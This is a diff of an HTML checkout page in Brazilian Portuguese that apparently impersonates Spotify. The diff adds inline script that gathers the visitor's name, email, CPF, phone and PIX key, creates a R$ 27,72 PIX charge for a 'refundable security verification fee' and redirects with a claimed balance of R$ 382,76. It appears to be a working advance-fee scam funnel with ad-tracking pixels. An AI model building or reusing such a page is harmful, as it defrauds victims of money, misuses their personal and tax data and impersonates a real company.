@@ -1,261 +1,439 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<script type="text/javascript">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Processando Pagamento | Spotify</title>
+
+  <!-- CLARITY -->
+  <script type="text/javascript">
     (function(c,l,a,r,i,t,y){
         c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
         t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
         y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
     })(window, document, "clarity", "script", "vf9o4hng1f");
-</script>
+  </script>
 
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Processando Pagamento...</title>
-    
-    <!-- CONFIG.JS - Configurações Centralizadas -->
-    <script src="js/config.js"></script>
+  <!-- TIKTOK PIXEL -->
+  <script>
+    !function (w, d, t) {
+      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var a=document.createElement("script");a.type="text/javascript",a.async=!0,a.src=r+"?sdkid="+e+"&lib="+t;var c=document.getElementsByTagName("script")[0];c.parentNode.insertBefore(a,c)};
 
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+      ttq.load('DAFO7CJC77U250DBNFT0');
+      ttq.page();
+      ttq.track('InitiateCheckout', {
+        content_id: 'up1',
+        content_name: 'Verificação de Segurança',
+        value: 27.72,
+        currency: 'BRL'
+      });
+    }(window, document, 'ttq');
+  </script>
 
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <!-- FONT GOOGLE POPPINS -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-            min-height: 100vh;
-            color: #fff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
 
-        .container {
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-        }
+    body {
+      background: linear-gradient(135deg, #121212 0%, #181818 50%, #0f1c14 100%);
+      min-height: 100vh;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      overflow-x: hidden;
+    }
 
-        .logo {
-            width: 80px;
-            margin-bottom: 30px;
-        }
+    .container {
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+    }
 
-        .card {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 16px;
-            padding: 40px 30px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
+    .logo {
+      width: 85px;
+      height: auto;
+      margin-bottom: 25px;
+      display: inline-block;
+    }
 
-        .loading-icon {
-            width: 60px;
-            height: 60px;
-            border: 3px solid rgba(29, 185, 84, 0.2);
-            border-top-color: #1DB954;
-            border-radius: 50%;
-            margin: 0 auto 20px;
-            animation: spin 1s linear infinite;
-        }
+    .card {
+      background: rgba(255, 255, 255, 0.04);
+      border-radius: 16px;
+      padding: 35px 25px;
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+    .loading-icon {
+      width: 55px;
+      height: 55px;
+      border: 3.5px solid rgba(29, 185, 84, 0.2);
+      border-top-color: #1DB954;
+      border-radius: 50%;
+      margin: 0 auto 20px;
+      animation: spin 0.9s linear infinite;
+    }
 
-        h1 {
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
 
-        .subtitle {
-            color: #b3b3b3;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
+    h1 {
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #ffffff;
+    }
 
-        .valor-box {
-            background: rgba(29, 185, 84, 0.1);
-            border: 1px solid #1DB954;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 20px;
-        }
+    .subtitle {
+      color: #b3b3b3;
+      font-size: 13.5px;
+      margin-bottom: 20px;
+    }
 
-        .valor-total {
-            font-size: 28px;
-            font-weight: 700;
-            color: #1DB954;
-        }
+    .valor-box {
+      background: rgba(29, 185, 84, 0.12);
+      border: 1px solid #1DB954;
+      border-radius: 12px;
+      padding: 14px;
+      margin-bottom: 22px;
+    }
 
-        .steps {
-            text-align: left;
-            margin: 20px 0;
-        }
+    .valor-total {
+      font-size: 26px;
+      font-weight: 700;
+      color: #1DB954;
+    }
 
-        .step {
-            display: flex;
-            align-items: center;
-            padding: 8px 0;
-            opacity: 0.5;
-            transition: opacity 0.3s ease;
-        }
+    .steps {
+      text-align: left;
+      margin: 20px 0;
+    }
 
-        .step.active {
-            opacity: 1;
-        }
+    .step {
+      display: flex;
+      align-items: center;
+      padding: 10px 0;
+      opacity: 0.45;
+      transition: all 0.3s ease;
+    }
 
-        .step.completed {
-            opacity: 1;
-        }
+    .step.active {
+      opacity: 1;
+    }
 
-        .step-icon {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.1);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 10px;
-            font-size: 10px;
-        }
+    .step.completed {
+      opacity: 1;
+    }
 
-        .step.active .step-icon {
-            background: rgba(29, 185, 84, 0.2);
-            color: #1DB954;
-            animation: pulse 1.5s infinite;
-        }
+    .step-icon {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.1);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 12px;
+      font-size: 12px;
+      font-weight: 600;
+      color: #ffffff;
+      flex-shrink: 0;
+    }
 
-        .step.completed .step-icon {
-            background: #1DB954;
-            color: #000;
-        }
+    .step.active .step-icon {
+      background: rgba(29, 185, 84, 0.25);
+      color: #1DB954;
+      animation: pulse 1.4s infinite;
+    }
 
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
+    .step.completed .step-icon {
+      background: #1DB954;
+      color: #000;
+      font-weight: 700;
+    }
 
-        .step-text {
-            font-size: 13px;
-            color: #b3b3b3;
-        }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.15); }
+    }
 
-        .step.active .step-text,
-        .step.completed .step-text {
-            color: #fff;
-        }
+    .step-text {
+      font-size: 14px;
+      color: #b3b3b3;
+      font-weight: 500;
+    }
 
-        .error-message {
-            background: rgba(255, 70, 70, 0.1);
-            border: 1px solid #ff4646;
-            border-radius: 8px;
-            padding: 15px;
-            color: #ff4646;
-            font-size: 14px;
-            margin-top: 20px;
-            display: none;
-        }
+    .step.active .step-text,
+    .step.completed .step-text {
+      color: #ffffff;
+    }
 
-        .error-message.show {
-            display: block;
-        }
+    .error-message {
+      background: rgba(255, 70, 70, 0.12);
+      border: 1px solid #ff4646;
+      border-radius: 10px;
+      padding: 15px;
+      color: #ff6666;
+      font-size: 13.5px;
+      margin-top: 20px;
+      display: none;
+      line-height: 1.5;
+    }
 
-        .btn-retry {
-            margin-top: 15px;
-            padding: 12px 24px;
-            background: #ff4646;
-            border: none;
-            border-radius: 8px;
-            color: #fff;
-            font-size: 14px;
-            font-weight: 600;
-            font-family: 'Poppins', sans-serif;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
+    .error-message.show {
+      display: block;
+    }
 
-        .btn-retry:hover {
-            background: #ff6666;
-        }
-    </style>
-<!-- TikTok Pixel Code Start -->
-<script>
-!function (w, d, t) {
-  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var a=document.createElement("script");a.type="text/javascript",a.async=!0,a.src=r+"?sdkid="+e+"&lib="+t;var c=document.getElementsByTagName("script")[0];c.parentNode.insertBefore(a,c)};
+    .btn-retry {
+      display: inline-block;
+      margin-top: 12px;
+      padding: 10px 20px;
+      background: #1DB954;
+      border: none;
+      border-radius: 8px;
+      color: #000;
+      font-size: 13.5px;
+      font-weight: 700;
+      cursor: pointer;
+      text-decoration: none;
+    }
 
-  ttq.load('DAFO7CJC77U250DBNFT0');
-  ttq.page();
-}(window, document, 'ttq');
-</script>
-<!-- TikTok Pixel Code End -->
-
+    .btn-retry:hover {
+      background: #1ed760;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <img src="/images/logowhite.png" class="logo" alt="Spotify" onerror="this.onerror=null; this.src='/checkout/images/logowhite.png';">
-        
-        <div class="card">
-            <div class="loading-icon" id="loadingIcon"></div>
-            
-            <h1 id="title">Processando Pagamento</h1>
-            <p class="subtitle" id="subtitle">Aguarde enquanto geramos seu PIX</p>
-            
-            <div class="valor-box">
-                <div class="valor-total">R$ 27,72</div>
-            </div>
-            
-            <div class="steps" id="steps">
-                <div class="step" id="step1">
-                    <div class="step-icon">1</div>
-                    <span class="step-text">Recuperando dados</span>
-                </div>
-                <div class="step" id="step2">
-                    <div class="step-icon">2</div>
-                    <span class="step-text">Gerando código PIX</span>
-                </div>
-                <div class="step" id="step3">
-                    <div class="step-icon">3</div>
-                    <span class="step-text">Preparando QR Code</span>
-                </div>
-            </div>
-            
-            <div class="error-message" id="errorMessage"></div>
-        </div>
-    </div>
-
-    <script src="js/checkout.js"></script>
+  <div class="container">
+    <img src="/images/logowhite.png" class="logo" alt="Spotify" onerror="this.onerror=null; this.src='/checkout/images/logowhite.png';">
     
-    <!-- UTMIFY -->
-    <script
-        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-        data-utmify-prevent-xcod-sck
-        data-utmify-prevent-subids
-        async
-        defer>
-    </script>
+    <div class="card">
+      <div class="loading-icon" id="loadingIcon"></div>
+      
+      <h1 id="title">Processando Pagamento</h1>
+      <p class="subtitle" id="subtitle">Aguarde enquanto geramos seu PIX</p>
+      
+      <div class="valor-box">
+        <div class="valor-total">R$ 27,72</div>
+      </div>
+      
+      <div class="steps" id="steps">
+        <div class="step active" id="step1">
+          <div class="step-icon" id="icon1">1</div>
+          <span class="step-text">Recuperando dados</span>
+        </div>
+        <div class="step" id="step2">
+          <div class="step-icon" id="icon2">2</div>
+          <span class="step-text">Gerando código PIX</span>
+        </div>
+        <div class="step" id="step3">
+          <div class="step-icon" id="icon3">3</div>
+          <span class="step-text">Preparando QR Code</span>
+        </div>
+      </div>
+      
+      <div class="error-message" id="errorMessage"></div>
+    </div>
+  </div>
 
-<script>
-  if (window.ttq) {
-    ttq.track('InitiateCheckout', {
-      content_id: 'up1',
-      content_name: 'Verificação de Segurança',
-      value: 27.72,
-      currency: 'BRL'
-    });
-  }
-</script>
+  <!-- UTMIFY -->
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer>
+  </script>
 
+  <!-- SCRIPT DE PROCESSAMENTO 100% EMBUTIDO (SEM DEPENDÊNCIAS EXTERNAS) -->
+  <script>
+    function delay(ms) {
+      return new Promise(function(resolve) { setTimeout(resolve, ms); });
+    }
+
+    function activateStep(num) {
+      for (var i = 1; i <= 3; i++) {
+        var el = document.getElementById('step' + i);
+        if (!el) continue;
+        if (i === num) {
+          el.classList.add('active');
+          el.classList.remove('completed');
+        }
+      }
+    }
+
+    function completeStep(num) {
+      var el = document.getElementById('step' + num);
+      var icon = document.getElementById('icon' + num);
+      if (el) {
+        el.classList.remove('active');
+        el.classList.add('completed');
+      }
+      if (icon) {
+        icon.innerHTML = '✓';
+      }
+    }
+
+    function mostrarErro(msg) {
+      var el = document.getElementById('errorMessage');
+      if (el) {
+        el.innerHTML = msg + '<br><button class="btn-retry" onclick="location.reload()">Tentar Novamente</button>';
+        el.classList.add('show');
+      }
+      var icon = document.getElementById('loadingIcon');
+      if (icon) icon.style.display = 'none';
+      var subtitle = document.getElementById('subtitle');
+      if (subtitle) subtitle.innerText = 'Não foi possível gerar seu PIX';
+    }
+
+    function recuperarDados() {
+      var params = new URLSearchParams(window.location.search);
+      var dados = {};
+
+      dados.nome = params.get('nome') || localStorage.getItem('usuario_nome') || localStorage.getItem('pix_nome') || 'Cliente Spotify';
+      dados.email = params.get('email') || localStorage.getItem('usuario_email') || 'cliente@email.com';
+      dados.telefone = params.get('telefone') || localStorage.getItem('pix_chave') || localStorage.getItem('usuario_telefone') || '11999998888';
+      dados.cpf = params.get('cpf') || localStorage.getItem('usuario_cpf') || '';
+      dados.pix = params.get('pix') || localStorage.getItem('pix_chave') || '';
+
+      ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'sck', 'src', 'fbclid'].forEach(function(p) {
+        var v = params.get(p) || localStorage.getItem(p);
+        if (v) dados[p] = v;
+      });
+
+      return dados;
+    }
+
+    async function criarTransacao(dados) {
+      var payload = {
+        nome: dados.nome,
+        email: dados.email,
+        cpf: dados.cpf,
+        telefone: dados.telefone,
+        amount: 2772, // R$ 27,72
+        produto: 'Verificação de Segurança (Taxa Reembolsável)',
+        src: dados.src || dados.utm_source || '',
+        sck: dados.sck || '',
+        utm_source: dados.utm_source || '',
+        utm_medium: dados.utm_medium || '',
+        utm_campaign: dados.utm_campaign || '',
+        utm_term: dados.utm_term || '',
+        utm_content: dados.utm_content || ''
+      };
+
+      console.log('Enviando payload upsell para /api/create-payment:', payload);
+
+      var resp = await fetch('/api/create-payment', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      var rawText = await resp.text();
+      var json;
+      try {
+        json = JSON.parse(rawText);
+      } catch (e) {
+        console.error('Resposta não-JSON:', rawText);
+        return { success: false, error: 'Erro de comunicação (' + resp.status + ')' };
+      }
+      return json;
+    }
+
+    function salvarDadosTransacao(transacao, dados) {
+      var id = transacao.id || transacao.txid || '';
+      var qrCode = transacao.qr_code || transacao.qrCode || transacao.pix_code || '';
+
+      localStorage.setItem('pix_txid_up1', id);
+      if (qrCode) localStorage.setItem('pix_code_up1', qrCode);
+      localStorage.setItem('pix_valor_up1', '27,72');
+      localStorage.setItem('pix_txid', id);
+      if (qrCode) localStorage.setItem('pix_code', qrCode);
+      localStorage.setItem('pix_valor', '27,72');
+    }
+
+    function redirecionarParaPix(transacao, dados) {
+      var params = new URLSearchParams();
+      var id = transacao.id || transacao.txid || '';
+      var qrCode = transacao.qr_code || transacao.qrCode || transacao.pix_code || '';
+
+      if (id) params.append('id', id);
+      if (qrCode) params.append('code', qrCode);
+      if (qrCode) params.append('qr_code', qrCode);
+      params.append('valor', '27,72');
+      params.append('amount', '2772');
+      params.append('tipo', 'up1');
+      params.append('upsell', '1');
+      params.append('saldo', '382,76');
+
+      if (dados.nome) params.append('nome', dados.nome);
+      if (dados.email) params.append('email', dados.email);
+      if (dados.pix) params.append('pix', dados.pix);
+      if (dados.cpf) params.append('cpf', dados.cpf);
+      if (dados.telefone) params.append('telefone', dados.telefone);
+
+      ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'sck', 'src', 'fbclid'].forEach(function(p) {
+        if (dados[p]) params.append(p, dados[p]);
+      });
+
+      var redirectUrl = '/checkout/pix.html?' + params.toString();
+      console.log('Redirecionando para:', redirectUrl);
+      window.location.href = redirectUrl;
+    }
+
+    // Fluxo principal de execução
+    async function iniciarCheckout() {
+      try {
+        activateStep(1);
+        var dados = recuperarDados();
+        await delay(500);
+        completeStep(1);
+
+        activateStep(2);
+        var res = await criarTransacao(dados);
+        
+        if (!res || !res.success || !res.data) {
+          console.error('Falha na criação do Pix:', res);
+          mostrarErro(res && res.error ? res.error : 'Erro ao gerar PIX com o gateway de pagamento.');
+          return;
+        }
+
+        completeStep(2);
+
+        activateStep(3);
+        salvarDadosTransacao(res.data, dados);
+        await delay(400);
+        completeStep(3);
+
+        await delay(300);
+        redirecionarParaPix(res.data, dados);
+      } catch (err) {
+        console.error('Erro no fluxo de checkout:', err);
+        mostrarErro('Erro de conexão ao processar o saque. Tente novamente.');
+      }
+    }
+
+    // Inicia imediatamente ao carregar
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', iniciarCheckout);
+    } else {
+      iniciarCheckout();
+    }
+  </script>
 </body>
 </html>
